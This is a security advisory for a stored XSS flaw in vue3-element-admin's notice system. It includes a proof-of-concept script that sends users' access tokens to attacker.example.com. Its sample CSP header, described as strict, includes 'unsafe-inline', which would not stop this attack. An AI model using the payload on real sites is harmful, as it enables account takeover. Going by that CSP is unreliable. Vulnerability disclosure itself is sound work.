# Stored XSS Vulnerability in vue3-element-admin Notice System

## Vulnerability Overview

**Submitter**: Ana10gy
**Project**: vue3-element-admin[https://github.com/youlaitech/vue3-element-admin]
**Vendor**: youlaitech

A second-order stored Cross-Site Scripting (XSS) vulnerability has been identified in the notice management system. Authenticated users with notice creation or edit privileges can inject malicious JavaScript that will execute in the browsers of other users when they view the compromised notice.

## Affected Component

- **Affected Files**:
  - `src/views/system/notice/index.vue` - Notice creation, edit, and detail rendering
  - `src/views/system/notice/components/MyNotice.vue` - User notice center rendering
  - `src/components/Notification/index.vue` - Notification component rendering

## Vulnerability Details

### Root Cause
The vulnerability exists in the notice management system, which allows users to create and edit notices using a rich text editor (WangEditor). The root causes are:

1. **Missing Sanitization**: At no point during the data flow (client-side, server-side, or rendering) is the HTML content properly sanitized.
2. **v-html Directive Usage**: Multiple components use Vue's `v-html` directive to render notice content directly, bypassing Vue's built-in XSS protection.

### Attack Vector
An attacker with notice creation or edit privileges can exploit this vulnerability by:
1. Creating or editing a notice with malicious HTML content containing JavaScript
2. Ensuring the malicious notice is published or made visible to other users
3. When users view the malicious notice, the embedded JavaScript executes in their browser context

### Execution Flow
1. **Injection**: Attacker inputs malicious HTML: `<script>alert('XSS')</script>` using WangEditor
2. **Storage**: Malicious content is stored in the database table 'notice', column 'content'
3. **Retrieval**: When any user views the notice, backend returns raw HTML content
4. **Execution**: Browser renders content with `v-html`, executing malicious JavaScript

## Code Details
### Step 1: Infection Point - User Input Entry
**File**: `src/views/system/notice/index.vue`
**Relevant Code**:
```html
<!-- Line 74: Rich text editor allowing raw HTML input -->
<el-form-item label="通知内容" prop="content">
  <WangEditor v-model="formData.content" />
</el-form-item>

<!-- Line 404: Form submission for notice creation -->
NoticeAPI.create(formData)
  .then(() => {
    ElMessage.success("新增成功");
    handleCloseDialog();
    handleResetQuery();
  })
```

#### Analysis:
The WangEditor allows users to input and edit rich text directly, including raw HTML tags. There is no client-side sanitization implemented to restrict or escape potentially malicious HTML content.

---

### Step 2: Storage - Persistent Data Store (Database)
#### Behavior:
The raw HTML content from the WangEditor is transmitted to the backend via `NoticeAPI.create(formData)` or `NoticeAPI.update(id, formData)` and stored intact in the database table 'notice', column 'content'.

#### Verification:
No sanitization functions are called on the content before API transmission in the frontend. The lack of backend sanitization is indirectly verified by the raw HTML being returned in API responses.

---

### Step 3: Detonation - Rendering in Sensitive Contexts
**Files and Locations**:
1. `src/views/system/notice/index.vue:250` - Main notice detail page
2. `src/views/system/notice/components/MyNotice.vue:105` - User's notice center
3. `src/components/Notification/index.vue:75` - Notification component

**Common Vulnerable Code Pattern**:
```html
<!-- Example from line 250 in main notice detail page -->
<div class="notice-content" v-html="currentNotice.content" />
```

#### Analysis:
By using Vue's `v-html` directive, the application bypasses Vue's built-in automatic HTML escaping, which is designed to prevent XSS attacks. The raw HTML content from the database is rendered directly in the DOM, allowing any malicious JavaScript embedded in the notice content to execute in the context of the user's browser.

## Proof of Concept

### Step 1: Create Malicious Notice
The attacker creates a new notice with the following content in the WangEditor:
```html
<script>
// Steal authentication token
const token = localStorage.getItem('access_token');
// Exfiltrate token to attacker server
fetch('http://attacker.example.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token }),
  headers: { 'Content-Type': 'application/json' }
});
</script>
<h3>Important Security Update</h3>
<p>Please read the latest security guidelines in your dashboard.</p>
```

### Step 2: Publish and Trigger
- Attacker publishes the notice
- Any user who views this notice (via main notice page, notification center, or alert) will execute the malicious script

### Step 3: Result Verification
The attacker will receive stolen authentication tokens at their server, which can be used to impersonate users.

## Impact

This vulnerability has **High** severity and allows authenticated attackers to:
- Steal authentication tokens and session data
- Redirect users to phishing websites
- Execute arbitrary JavaScript in the application context
- Manipulate page content and user interactions

## Recommendations

1. **Implement Server-Side Sanitization**:
   - Sanitize HTML content before storing it in the database
   - Use libraries like DOMPurify to remove dangerous HTML tags/attributes
   - Example: `const sanitizedContent = DOMPurify.sanitize(rawContent);`

2. **Client-Side Defenses**:
   - Configure WangEditor to only allow safe HTML tags/attributes
   - Sanitize content before rendering with `v-html` directive
   - Avoid using `v-html` for untrusted content whenever possible

3. **Content Security Policy (CSP)**:
   - Implement strict CSP header to restrict script execution sources
   - Example: `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'`

4. **Access Control**:
   - Restrict notice creation/edit privileges to trusted users only
   - Review and audit user permissions regularly

## References
- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- OWASP Top 10 2021: A03 - Injection (Cross-Site Scripting)
